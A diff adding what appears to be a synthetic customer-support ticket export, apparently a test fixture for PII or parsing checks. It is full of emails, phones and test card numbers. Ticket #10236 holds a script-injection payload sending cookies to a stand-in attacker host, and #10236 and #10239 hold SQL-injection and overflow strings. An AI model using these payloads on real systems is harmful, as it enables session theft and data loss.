@@ -1,0 +1,58 @@
+=== Customer Support Export — Ticket Batch #4471 ===
+Generated: 2026-09-04 | Source: legacy-crm-api-v2 | Encoding: UTF-8 (unverified)
+
+Ticket #10234
+From: sarah.mutoni@alueducation.com
+Subject: Unable to access student portal after graduation
+Body: Hi team, I graduated in June and I'm still trying to reach the alumni network.
+My personal backup contact is s.mutoni92@gmail.com and my WhatsApp is +250 788 123 456.
+I tried calling the office at (250) 788-999-111 but no one picked up. Also tried
+078-222-3344 just in case. Please advise. Thanks! #ALUAlumni #StillWaiting
+
+Ticket #10235
+From: k.uwase@alumni.alueducation.com
+Subject: Refund for duplicate charge
+Body: I was charged twice for my program materials. First charge was $149.99 on
+2026-08-14 at 09:30 AM, second charge was $149.99 again at 9:30am the same day.
+Card used ends in messy formatting: 4539 1488 0343 6467 (visa). Please refund
+one of the charges to that card. My advisor's email for reference is
+j.karenzi@si.alueducation.com — cc him too. Meeting is booked for 14:00 (2:00 PM EAT).
+
+Ticket #10236 [FLAGGED — suspicious payload]
+From: "admin"<script>document.location='http://evil-capture.example/steal?c='+document.cookie</script>@fake-domain.ru
+Subject: URGENT!! Account Verification Required
+Body: Click here to verify: http://192.168.1.1@secure-login-alueducation.com.verify-now.ru/index.php?redirect=javascript:alert(1)
+Also try hxxp://bit.ly/3xKp9z or www.totally-legit-bank.com/login.html?user=admin'--
+DROP TABLE users; -- Card number for "verification": 1234 5678 9012 3456 (invalid Luhn)
+Fake time stamp: 25:99 PM. Contact: not-an-email-at-all@@doubled.com
+
+Ticket #10237
+From: emmanuel.hakizimana@alueducation.com
+Subject: Invoice question
+Body: Please see attached invoice for €1,250.00 and an additional processing fee of
+£45.50 / $60. Discount code: SAVE20%OFF applied at checkout 03:15 PM (15:15). Reference
+site: https://billing.alueducation.com/invoices/2026/09?id=88213&ref=abc-def_123
+Support widget on our site uses <div class="chat-widget" data-user="10237"><b>Live</b></div>
+which sometimes renders raw in exports. Ignore the HTML noise. #Invoice2026 #Billing
+
+Ticket #10238
+From: t.nshimiye@alumni.alueducation.com, secondary: t.nshimiye+jobs@gmail.com
+Subject: Event reminder
+Body: Reminder: Career fair starts at 8:00 AM and wraps up by 5:30pm. Venue map:
+http://maps.example.com/alu-kigali-campus?zoom=15#pin=22 Bring your ID. Bus leaves
+at 07:45. Don't forget #CareerFair2026 and #ALUKigali. Emergency contact
++250-722-000-111 or the front desk on 0788445566.
+
+Ticket #10239 [malformed / truncated export row]
+From: ; DROP TABLE tickets;-- @nowhere
+Subject:
+Body: %00%00 buffer_overflow_test AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+card?: 0000 0000 0000 0000 phone?: 000-000-0000 time?: 99:99
+
+Ticket #10240
+From: grace.iradukunda@si.alueducation.com
+Subject: Payment confirmation
+Body: Payment of $2,399.00 received for Term 3 tuition on 2026-08-30. A partial
+refund of KES 15,000 was issued separately. Old card on file (do not use):
+5500-0000-0000-0004, new card ending 6011000990139424. Office hours 9:00 AM - 5:00 PM.
+Visit https://portal.alueducation.com/payments for the full statement. #TuitionPaid
